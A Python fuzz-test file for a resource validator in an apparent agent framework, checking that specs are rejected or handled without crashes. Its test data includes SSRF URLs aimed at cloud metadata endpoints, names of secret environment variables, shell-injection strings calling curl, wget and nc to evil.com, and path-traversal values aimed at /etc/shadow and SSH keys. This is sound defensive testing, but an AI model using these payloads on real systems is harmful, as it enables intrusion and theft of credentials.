"""Fuzz / property-based tests for the offline resource validation layer.

These tests exercise ``validate_resource`` directly (no HTTP server) to verify
that the validation function never crashes on arbitrary input.  It should
always return a well-formed ``(errors, refs)`` tuple regardless of how
malicious or nonsensical the input is.
"""

from __future__ import annotations

from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from blackbeard.kinds import KIND_TO_PLURAL
from blackbeard.resources.validator import validate_resource

_ALL_KINDS = list(KIND_TO_PLURAL.keys())

# Strategy that generates arbitrary JSON-like values (strings, ints, floats,
# bools, None, nested dicts/lists).  Kept shallow to avoid Hypothesis slowdowns.
_json_primitives = st.one_of(
    st.none(),
    st.booleans(),
    st.integers(min_value=-(2**31), max_value=2**31),
    st.floats(allow_nan=False, allow_infinity=False),
    st.text(max_size=200),
)

_json_values = st.recursive(
    _json_primitives,
    lambda children: st.one_of(
        st.lists(children, max_size=5),
        st.dictionaries(st.text(max_size=30), children, max_size=10),
    ),
    max_leaves=50,
)


# ---------------------------------------------------------------------------
# 1. Fuzz validate_resource with known kinds and random specs
# ---------------------------------------------------------------------------


@given(
    kind=st.sampled_from(_ALL_KINDS),
    spec=st.dictionaries(st.text(max_size=50), _json_values, max_size=30),
)
@settings(max_examples=500, deadline=None, suppress_health_check=[HealthCheck.too_slow])
def test_fuzz_validate_resource_known_kinds(kind, spec):
    """validate_resource should never crash, only return errors for known kinds."""
    result = validate_resource(kind, spec)
    # Should always return a 2-tuple
    assert isinstance(result, tuple)
    assert len(result) == 2
    errors, _refs = result
    assert isinstance(errors, list)
    # refs is either a list or None
    assert _refs is None or isinstance(_refs, list)


# ---------------------------------------------------------------------------
# 2. Fuzz validate_resource with unknown/random kind strings
# ---------------------------------------------------------------------------


@given(
    kind=st.text(max_size=50),
    spec=st.dictionaries(st.text(max_size=50), _json_values, max_size=30),
)
@settings(max_examples=200, deadline=None, suppress_health_check=[HealthCheck.too_slow])
def test_fuzz_validate_resource_random_kinds(kind, spec):
    """validate_resource should handle unknown kinds gracefully."""
    result = validate_resource(kind, spec)
    assert isinstance(result, tuple)
    assert len(result) == 2
    errors, _refs = result
    assert isinstance(errors, list)
    # Unknown kinds should produce at least one error
    if kind not in _ALL_KINDS:
        assert len(errors) >= 1


# ---------------------------------------------------------------------------
# 3. Fuzz validate_resource with Agent-shaped specs containing evil values
# ---------------------------------------------------------------------------


@given(
    role=st.text(max_size=5000),
    goal=st.text(max_size=5000),
    backstory=st.text(max_size=5000),
    llm=st.one_of(st.none(), st.text(max_size=500)),
    tools=st.lists(st.text(max_size=200), max_size=20),
    extra_fields=st.dictionaries(st.text(max_size=50), _json_values, max_size=10),
)
@settings(max_examples=200, deadline=None, suppress_health_check=[HealthCheck.too_slow])
def test_fuzz_validate_agent_shaped(role, goal, backstory, llm, tools, extra_fields):
    """Agent-like specs with random field values should never crash."""
    spec = {
        "role": role,
        "goal": goal,
        "backstory": backstory,
        "tools": tools,
        **extra_fields,
    }
    if llm is not None:
        spec["llm"] = llm

    errors, _refs = validate_resource("Agent", spec)
    assert isinstance(errors, list)


# ---------------------------------------------------------------------------
# 4. Fuzz validate_resource with LLMConnection specs (SSRF surface)
# ---------------------------------------------------------------------------

EVIL_SSRF_URLS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:22/",
    "http://[::1]/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://kubernetes.default.svc/api/v1/secrets",
    "file:///etc/passwd",
    "gopher://evil.com:25/",
    "ftp://internal/",
    "http://host.docker.internal:2375/containers/json",
    "http://100.64.0.1/",
]

EVIL_ENV_NAMES = [
    "BLACKBEARD_API_KEY",
    "DATABASE_URL",
    "LITELLM_MASTER_KEY",
    "AWS_SECRET_ACCESS_KEY",
    "PATH",
    "LD_PRELOAD",
    "PYTHONPATH",
    "OPENAI_API_KEY",
    "JWT_SECRET",
]


def test_llm_connection_ssrf_urls():
    """LLMConnection with SSRF URLs should be caught by validation."""
    for url in EVIL_SSRF_URLS:
        spec = {
            "provider": "openai",
            "model": "gpt-4",
            "base_url": url,
        }
        errors, _ = validate_resource("LLMConnection", spec)
        assert isinstance(errors, list)
        # Should have at least one error for the bad URL
        has_url_error = any(
            "url" in e.field.lower() or "base_url" in e.field.lower() for e in errors
        )
        assert has_url_error, f"No URL error for SSRF attempt: {url}"


def test_llm_connection_env_exfiltration():
    """LLMConnection with blocked env var names should be caught."""
    for env_name in EVIL_ENV_NAMES:
        spec = {
            "provider": "openai",
            "model": "gpt-4",
            "api_key_env": env_name,
        }
        errors, _ = validate_resource("LLMConnection", spec)
        assert isinstance(errors, list)
        has_env_error = any("api_key_env" in e.field for e in errors)
        assert has_env_error, f"No env error for blocked var: {env_name}"


# ---------------------------------------------------------------------------
# 5. Fuzz Tool specs (shell injection, dangerous imports)
# ---------------------------------------------------------------------------

# Commands containing shell metacharacters that the validator must reject.
# These are test data strings, never executed.
# The validator checks for: [;&|`$(){}!\n\r\\<>~#] and path traversal (.., ~, /)
_EVIL_TOOL_COMMANDS = [
    "; cat /etc/passwd",
    "$(curl evil.com)",
    "`wget evil.com`",
    "cmd & echo pwned",
    "test | nc evil.com 4444",
    "../../../bin/sh",
    "~/evil.sh",
    "/usr/bin/python3",
]


def test_tool_shell_injection():
    """Tool specs with shell metacharacters in command should be caught."""
    for cmd in _EVIL_TOOL_COMMANDS:
        spec = {
            "type": "mcp-stdio",
            "command": cmd,
            "description": "test tool",
        }
        errors, _ = validate_resource("Tool", spec)
        assert isinstance(errors, list)
        # Should catch dangerous commands
        has_cmd_error = any("command" in e.field for e in errors)
        assert has_cmd_error, f"No command error for shell injection: {cmd}"


# Class paths that should be blocked by the allowlist.
# These are string literals used as test data, never imported or called.
_EVIL_TOOL_CLASS_PATHS = [
    "evil_module.EvilClass",
    "not_allowed.BadTool",
    "random_package.Exploit",
]


def test_tool_dangerous_class_paths():
    """Tool specs with non-allowlisted class_path values should be caught."""
    for class_path in _EVIL_TOOL_CLASS_PATHS:
        spec = {
            "type": "python",
            "class_path": class_path,
            "description": "test tool",
        }
        errors, _ = validate_resource("Tool", spec)
        assert isinstance(errors, list)
        has_class_error = any("class_path" in e.field for e in errors)
        assert has_class_error, f"No class_path error for: {class_path}"


# ---------------------------------------------------------------------------
# 6. Fuzz KnowledgeSource specs (path traversal)
# ---------------------------------------------------------------------------

EVIL_PATHS = [
    "../../../etc/passwd",
    "/etc/shadow",
    "~/.ssh/id_rsa",
    "\\windows\\system32\\config\\sam",
    "file\x00.txt",
    "....//....//etc/passwd",
]


def test_knowledge_source_path_traversal():
    """KnowledgeSource with path traversal should be caught."""
    for path in EVIL_PATHS:
        spec = {
            "type": "file",
            "file_paths": [path],
        }
        errors, _ = validate_resource("KnowledgeSource", spec)
        assert isinstance(errors, list)
        has_path_error = any("file_paths" in e.field for e in errors)
        assert has_path_error, f"No path traversal error for: {path}"


# ---------------------------------------------------------------------------
# 7. Fuzz Guardrail and Flow function_path validation
# ---------------------------------------------------------------------------

# Function paths referencing blocked modules. Test data only, never imported.
_EVIL_GUARDRAIL_FUNC_PATHS = [
    "not_allowed.check",
    "random_evil.validate",
]


def test_guardrail_function_path_blocked():
    """Guardrail with non-allowlisted function_path should be caught."""
    for func_path in _EVIL_GUARDRAIL_FUNC_PATHS:
        spec = {
            "type": "input",
            "function_path": func_path,
            "description": "test guardrail",
        }
        errors, _ = validate_resource("Guardrail", spec)
        assert isinstance(errors, list)
        has_func_error = any("function_path" in e.field for e in errors)
        assert has_func_error, f"No function_path error for: {func_path}"


def test_flow_step_function_path_blocked():
    """Flow with non-allowlisted step function_path should be caught."""
    for func_path in _EVIL_GUARDRAIL_FUNC_PATHS:
        spec = {
            "crews": ["ref:crews/test"],
            "steps": [
                {
                    "name": "evil-step",
                    "function_path": func_path,
                    "crew": "ref:crews/test",
                }
            ],
        }
        errors, _ = validate_resource("Flow", spec)
        assert isinstance(errors, list)
        has_func_error = any("function_path" in e.field for e in errors)
        assert has_func_error, f"No function_path error in flow step for: {func_path}"


# ---------------------------------------------------------------------------
# 8. Fuzz validate_resource with deeply nested specs
# ---------------------------------------------------------------------------


def test_deeply_nested_spec_does_not_crash():
    """Very deeply nested specs should not cause a stack overflow."""
    # Build a 100-level deep nested dict
    spec: dict = {"leaf": "value"}
    for _ in range(100):
        spec = {"nested": spec}

    for kind in _ALL_KINDS:
        errors, _refs = validate_resource(kind, spec)
        assert isinstance(errors, list)


# ---------------------------------------------------------------------------
# 9. Fuzz validate_resource with specs containing special numeric values
# ---------------------------------------------------------------------------


def test_special_numeric_values():
    """Specs with extreme/special numeric values should not crash."""
    evil_specs = [
        {"role": "x", "goal": "x", "backstory": "x", "max_iter": 2**63},
        {"role": "x", "goal": "x", "backstory": "x", "max_iter": -(2**63)},
        {"role": "x", "goal": "x", "backstory": "x", "max_iter": 0},
        {"role": "x", "goal": "x", "backstory": "x", "temperature": 1e308},
        {"role": "x", "goal": "x", "backstory": "x", "temperature": -1e308},
    ]
    for spec in evil_specs:
        errors, _refs = validate_resource("Agent", spec)
        assert isinstance(errors, list)
